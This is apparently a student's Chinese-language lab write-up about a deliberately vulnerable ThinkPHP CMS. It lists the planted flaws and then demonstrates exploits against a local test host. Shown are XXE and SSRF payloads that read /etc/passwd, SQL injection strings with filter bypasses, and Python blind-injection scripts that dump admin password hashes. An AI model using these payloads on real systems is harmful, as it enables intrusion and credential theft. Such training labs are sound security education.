<li><p>首先在数据库中建立一个数据库，复制cms.sql中的内容在命令行中运行</p>
</li>
<li><p>将文件放入www目录下，修改config中的database.php内容，将用户名和密码该对应的内容</p>
</li>
<li><p>打开phpstduy,选择 其他菜单选项-&gt;站点域名管理，网站目录选择cms&#x2F;public，网站名随便起，如<a href="http://www.mycms.com/">www.mycms.com</a></p>
</li>
<li><p>打开host文件，添加 <code>127.0.0.1  www.mycms.com</code>，然后访问即可<a href="http://www.mycms.com/admin%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0">www.mycms.com/admin进入后台</a></p>
<p>账号密码都为admin</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321160739254.png" style="zoom:50%;"></li>
</ul>
<h2 id="3-开发过程"><a href="#3-开发过程" class="headerlink" title="3.开发过程"></a>3.开发过程</h2><p>开发thinkphp的网站，当然离不开ThinkPHP的手册<code>http://www.shouce.ren/api/view/a/15517</code></p>
<p>thinkphp中是基于<code>模块\控制器\方法</code>来访问网页的，所以我们必须学会如何创建一个控制器</p>
<p>在网站的文件下，调出终端使用</p>
<pre><code class="hljs gauss">php think <span class="hljs-built_in">make</span>:controller  模块名\控制器名</code></pre>

<p>创建完后便可以在浏览器中输入<code>127.0.0.1\模块名\控制器名</code>，进行访问，当然还要继续完善其中的内容</p>
<p>以上是开发最基础的部分，也是最重要的部分，所有的漏洞代码基本都需要在自己所创建的控制器中完成的。</p>
<h2 id="4-网站介绍"><a href="#4-网站介绍" class="headerlink" title="4.网站介绍"></a>4.网站介绍</h2><p>此站点采用的是基于thinkPHP的cms，此cms包含常用于一些公司主页介绍或者个人博客的搭建，是一个功能相对比较齐全的cms，但是随着功能的增多也会暴露出一些问题，所以会存在一些漏洞，加上自己根据课程要求对其进行了魔改，使得该系统包含了十二种漏洞，二十个漏洞点。</p>
<p>该网站是一家安全公司的主页，但是由于该安全公司刚刚成立不久，网站开发人员安全意识不够高（haha, 纯属虚构），导致该网站中存在了很多漏洞，此时一个不安好心的黑客看上了这家安全公司的网站。对该网站进行了攻击。</p>
<p>具体功能如下：</p>
<p>(1).前台展示页面，包含关于我们，新闻中心，联系我们以及意见反馈四个模块</p>
<p>其中关于我们–&gt;公司主页 位置存在SSRF漏洞</p>
<p>意见反馈 存在XXE漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181531579.png" alt="image-20210408181531579"></p>
<p>(2).后台管理员页面，后台管理功能十分丰富，几乎包含所有需要的功能，并且可以根据需要自定义模块并安装，其中的短消息发送存在XSS漏洞，查看内网主机和phpinfo存在远程命令执行漏洞，管理会员的页面存在CSRF漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181705018.png" alt="image-20210408181705018"></p>
<p>(3).用户注册与登录，提供用户注册和登录功能，登录后的用户可以根据权限向不同的栏目投稿，向别的用户发送消息，支持头像更换，密码修改等功能。其中投稿位置存在XSS漏洞和文件上传漏洞，密码修改位置存在SQL注入漏洞。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421223320698.png" alt="image-20210421223320698"></p>
<p>(4).在前台页面中有一个单独的模块，叫免试加入，这里存在一个CTF题目，类型时unserialize，如果可以获取flag，则可以获取免试资格加入团队。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181601058.png" alt="image-20210408181601058" style="zoom:67%;">

<h2 id="5-漏洞介绍"><a href="#5-漏洞介绍" class="headerlink" title="5.漏洞介绍"></a>5.漏洞介绍</h2><ul>
<li><p>本地文件包含</p>
<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞，造成这个漏洞的函数有四个<code>include,include_once,require,require_once</code>。该漏洞可以使用php为协议php:&#x2F;&#x2F;filter，读取php文件的源码，在一些ctf题目中很常见。</p>
<p>该漏洞存在于网站首页的联系我们页面</p>
</li>
<li><p>ssrf</p>
<p>服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，攻击者可以利用该漏洞对内网进行扫描探测存活的主机和端口，进而对内网进行攻击。此外该漏洞还会造成文件包含，使用file:&#x2F;&#x2F;协议+文件绝对路径可以获取服务器上的文件。</p>
<p>总结SSRF造成的危害：</p>
<ul>
<li><p>扫内网</p>
</li>
<li><p>向内部任意主机的任意端口发送精心构造的Payload</p>
</li>
<li><p>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
</li>
<li><p>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）</p>
</li>
<li><p>利用file协议读取本地文件等</p>
</li>
</ul>
<p>此漏洞存在访问公司主页</p>
</li>
<li><p>xxe</p>
<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体。</p>
<p>此漏洞可以形成命令执行和文件包含攻击。</p>
<p>此漏洞存在于意见反馈页面</p>
</li>
<li><p>sql注入 — 包含两个漏洞点</p>
<p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
<p>此漏洞存在与用户修改密码页面和登录修改稿件页面，二者都可以使用盲注进行攻击。</p>
</li>
<li><p>文件上传</p>
<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
<p>此漏洞存在于用户上传头像的位置，上传一句话木马后可直接使用蚁剑获取shell</p>
</li>
<li><p>弱口令</p>
<p>弱口令顾名思义是使用了安全性比较低，并且比较常见的短字符作为密码</p>
<p>此漏洞存在于管理员密码，这是很常见但又很危险的一个漏洞</p>
</li>
<li><p>xss       — 包含两个漏洞点</p>
<p>xss就是攻击者在web页面插入恶意的Script代码，当用户浏览该页之时，嵌入其中web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。攻击这可以使用xss获取处于登录状态的用户cookie，从而可以无密码登录账号。</p>
<p>此漏洞存在两个地方，一个是用户投稿，一个用户发送短消息</p>
</li>
<li><p>rce</p>
<p>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
<p>此漏洞存在于后台管理页面中的信息采集–&gt;查看内网主机</p>
</li>
<li><p>任意文件下载</p>
<p>非法下载服务器上存在的资源</p>
</li>
<li><p>csrf</p>
<p>跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321220650619.png" alt="image-20210321220650619" style="zoom:50%;">


</li>
<li><p>反序列化  </p>
<p>不安全的反序列化是指网站对用户可控制的数据进行反序列化时，攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。甚至有可能用完全不同类的对象替换序列化的对象。更夸张的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞</p>
<p>此漏洞存在免试加入我们的页面，成功者可以获得一个flag。</p>
</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>渗透测试流程</p>
<p><img src="/2021/03/21/mycms/Users/Sunzh/Desktop/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.png" alt="网络攻击与防御实践渗透测试流程"></p>
<h2 id="1-RFI"><a href="#1-RFI" class="headerlink" title="1.RFI"></a>1.RFI</h2><p>首先点击首页的最下面“优秀员工”，可以发现URL的变化，看到最后有一个file参数，猜测该页面的一些参数是从<code>info.php</code>中获取的，那么这个位置就应该是一个本地文件包含。尝试将info.php换成其他的文件名，发现页面中的一些内容消失了，说明这里就是用了文件包含。</p>
<p>那么如果没有对该参数进行过滤或者其他的限制的话，我们就可以使用<code>php://filter</code>协议读取到php文件的base64源码，</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101403284.png" alt="image-20210401101403284"></p>
<p>或者直接读取操作系统中的一些敏感文件，如<code>/etc/passwd</code>。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101335296.png" alt="image-20210401101335296"></p>
<p>可以看到，这里没有对file协议过滤，这样就可以通过一些常用的文件路径获取到敏感文件</p>
<h2 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2.XXE"></a>2.XXE</h2><p>注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
<p>xxe漏洞存在于意见反馈页面，使用Bp抓包可以看到，提交的参数是xml格式，提交成功后会返回一个提示信息<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322094353064.png" alt="image-20210322094353064"></p>
<p>既然参数是以xml格式提交的，那么我们可以尝试构造出一个外部实体注入其中，造成文件包含或者命令执行。</p>
<p>使用payload读取<code>/etc/passwd</code>文件</p>
<pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;info&gt;as&lt;/info&gt;&lt;/user&gt;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322095014823.png" alt="image-20210322095014823"></p>
<h2 id="3-SSRF"><a href="#3-SSRF" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><p>当访问公司主页这个页面时会发现url发生变化，并跳转到另一页面</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192059989.png" alt="image-20210322192059989" style="zoom:50%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192116225.png" alt="image-20210322192116225" style="zoom:67%;">

<p>这里是跳转到了我的博客页面，但是可能由于缺少渲染，显示不正常，尝试访问百度，get提交</p>
<pre><code class="hljs awk">?url=https:<span class="hljs-regexp">//</span>www.baidu.com</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192303582.png" alt="image-20210322192303582"></p>
<p>可以发现成功跳转到了百度的页面，猜测我们提交的url参数没有进行过滤就直接带入到函数中执行。</p>
<p>那么我们可以尝试使用<code>file://</code>协议读取服务器上的文件，使用payload:<code>?url=file:///etc/passwd</code>，成功读取到文件内容，漏洞利用成功。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192737122.png" alt="image-20210322192737122"></p>
<h2 id="4-目录遍历"><a href="#4-目录遍历" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><p>在浏览器中按F12，在network中查看响应头，可以发现存在server字段，这是网站使用的服务器以及版本信息，这里可以看到是nginx</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414192735246.png" alt="image-20210414192735246" style="zoom:50%;">

<p>而nginx存在一个很常见的漏洞—配置不当导致的目录穿越漏洞</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193433871.png" alt="image-20210414193433871" style="zoom:67%;">



<p>进行攻击</p>
<p>尝试访问<code>http://192.168.164.147/files/</code>，出现了<code>images</code>文件夹，这应该网站保存上传图片的位置</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193646247.png" alt="image-20210414193646247"></p>
<p>输入<code>http://192.168.164.147/files../</code>看到了网站的根目录中的内容，点击可以将部分文件下载。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414194304371.png" alt="image-20210414194304371" style="zoom: 50%;">

<h2 id="5-SQL注入（4个）"><a href="#5-SQL注入（4个）" class="headerlink" title="5.SQL注入（4个）"></a>5.SQL注入（4个）</h2><h3 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>第一个sql注入漏洞点在用户登录页面，存在一个修改密码功能，先注册有一个用户，尝试修改密码，猜测其工作机制。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193046802.png" alt="image-20210322193046802" style="zoom:67%;">

<p>第一次尝试输入一个不存在的用户名，返回信息是<code>no user!</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193527184.png" alt="image-20210322193527184"></p>
<p>第二次输入正确的用户名错误的密码，提示<code>wrong password!</code>，这个逻辑很正常</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193635551.png" alt="image-20210322193635551"></p>
<p>第三次输入正确的用户名和密码，而两个不一样的新密码，提示<code>new password are different!</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193733391.png" alt="image-20210322193733391"></p>
<p>这上面的三种情况是修改密码时常见的情况，看似都可以正常的工作，但是如果没有对用户名这个参数进行严格的过滤的话就可以造成盲注的漏洞。</p>
<p>因为当我们提交完参数后，服务器要做的第一件事就是去数据库种查找是否存在该用户名，若不存在则返回<code>no user!</code>，若存在的话且输入的两次新密码都正确但是旧密码错误，就会提示用户<code>wrong password!</code>，这也是造成盲注的重要原因。比如说，我们注册的用户名和密码分别为<code>szy</code>和<code>admin</code>，但是我们提交时构造出如下的语句</p>
<pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span>
<span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194605601.png" alt="image-20210322194605601"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194635676.png" alt="image-20210322194635676"></p>
<p>看到以上的结果我们就可以判断一定存在注入。</p>
<p>构造payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> #&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194849731.png" alt="image-20210322194849731"></p>
<p>返回的是<code>wrong password</code>，说明数据库名的第一个字符的ascii码是大于100的，直接使用二分注入，脚本如下</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>

heard = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
    left = <span class="hljs-number">32</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(left &lt; right):
        <span class="hljs-comment"># time.sleep(1)</span>
        payload = <span class="hljs-string">&quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        data = &#123;<span class="hljs-string">&quot;account&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;111a&quot;</span>,<span class="hljs-string">&quot;npassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;newpassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>&#125;
        response = requests.post(url=url,data=data,headers=heard)
        <span class="hljs-comment"># t = response.text</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;wrong password&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)
<span class="hljs-built_in">print</span>(flag)
​```
database:yzncms
table:yzn_admin
columns:<span class="hljs-built_in">id</span>,username,password,roleid,encrypt
​```</code></pre>

<p>yzn_admin的列名，省略了后面的列</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322200732911.png" alt="image-20210322200732911"></p>
<p>获取管理员的用户名和密码</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin
<span class="hljs-symbol">password:</span><span class="hljs-number">9724</span>b5e6c56b95f5723009ef81961bfe</code></pre>

<p>这个密码是32位的，可能是md5处理后保存的，暂时无法破解。</p>
<h3 id="漏洞点二"><a href="#漏洞点二" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后，存在一个查找用户邮箱的功能，这里可能存在注入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181146985.png" alt="image-20210421181146985" style="zoom:67%;">

<p>这里已经提示了存在了过滤，那么就看看过滤那些东西</p>
<p>输入一个存在的用户名，查找结果如图</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181314404.png" alt="image-20210421181314404" style="zoom:50%;">

<p>输入一个不存在的用户</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181345626.png" alt="image-20210421181345626" style="zoom:33%;">

<p>尝试输入</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sunzy</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #</code></pre>

<p>网页报错，并将错误信息显示，可以看到输入的or,空格都被换成了空格，这还是很容易绕过的</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181603698.png" alt="image-20210421181603698" style="zoom:50%;">

<p>fuzz测试后，发现过滤<code>union,空格,or,and,select,from</code>，可以使用双写绕过，空格的可以使用<code>/**/</code>替换</p>
<p>经过测试，发现返回结果只有一列</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421182546039.png" alt="image-20210421182546039" style="zoom: 50%;">

<p>直接进行sql注入</p>
<ul>
<li><p>获取数据库中的表名</p>
<pre><code class="hljs gauss">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-built_in">group_concat</span>(table_name)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-built_in">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183121965.png" alt="image-20210421183121965" style="zoom:50%;">
</li>
<li><p>获取字段名</p>
<pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">column_name</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;yzn_member&quot;</span>#</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183924790.png" alt="image-20210421183924790" style="zoom:50%;">
</li>
<li><p>获取字段值</p>
<pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">passwoorrd</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>yzn_member#</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421184126966.png" alt="image-20210421184126966" style="zoom:67%;"></li>
</ul>
<h3 id="漏洞点三"><a href="#漏洞点三" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>用户主页-&gt;积分赠送，通过测试可以发现也是存在sql注入的</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423172440793.png" alt="image-20210423172440793" style="zoom:50%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423173007408.png" alt="image-20210423173007408" style="zoom:50%;">

<p>因为没有回显，需要使用盲注</p>
<p>盲注脚本与上面的类似，稍加修改即可。</p>
<h3 id="漏洞点四"><a href="#漏洞点四" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>注册后登录，发现其中存在一个投稿的功能，投稿后需要管理员审核，在此期间我们可以再次编辑我们的稿件</p>
<p>当点击编辑后，发现url上多了一个id参数，这应该是我们稿件的id，方便查询。但是通常这种参数如果过滤不严格的话也会存在SQL注入，而这个位置显然输入数字型注入。</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/member/</span>content/edit.html?id=<span class="hljs-number">3</span></code></pre>

<p>探测是否 存在注入，当输入<code>?id=3 and 1=1 #</code>时页面返回正常，但是当输入<code>?id=3 and 1=2#</code>,却提示了稿件不存在，说明这里也是存在注入的，但是没有回显，无法获取返回的内容只能采用盲注的方法。</p>
<p>&#x3D;&#x3D;在测试的过程种发现这个位置使用 <code>&gt;</code>时会出现错误提示，而<code>&lt;</code>不起作用，只能使用<code>=</code>，所以无法使用二分注入，但是直接暴力破解也很快&#x3D;&#x3D;</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2021/3/20 9:03</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : cms_sql2.py</span>

<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&quot;http://192.168.164.147:81/member/content/edit.html?id=&quot;</span>
header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;</span>&#125;
flag = <span class="hljs-string">&quot;&quot;</span>
words = [<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>():
    flag = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:
            <span class="hljs-comment"># payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word))</span>
            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
            url1 = url+payload

            res = requests.get(url1,headers=header)
            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;立即提交&quot;</span> <span class="hljs-keyword">in</span> res.text:
                flag += word
                <span class="hljs-keyword">break</span>
        <span class="hljs-built_in">print</span>(flag)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    dump()</code></pre>

<p>成功获取到数据库名，漏洞利用成功。</p>
<h2 id="6-暴力破解"><a href="#6-暴力破解" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><p>该漏洞是由于管理员或者用户使用了常用的简单密码，攻击者可以通过暴力破解的方式获取用户名和密码，前面的sql注入我们可以知道管理员账号为admin,但是密码为加盐后的md5值，我们无法破解，只能尝试使用暴力破解。</p>
<p>在文件上传漏洞点一中我们发现了admin模块就在路径为<code>\application\admin</code>，所以管理员后台url应该为<code>http://192.168.164.147/admin</code></p>
<p>当然这里也可以根据经验猜测后台登录路径。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323144704682.png" alt="image-20210323144704682"></p>
<p>访问后台</p>
<p>查看源码可以发现，登录是需要token的，但是还是可以使用bp自带的模块破解，不过需要麻烦一点。</p>
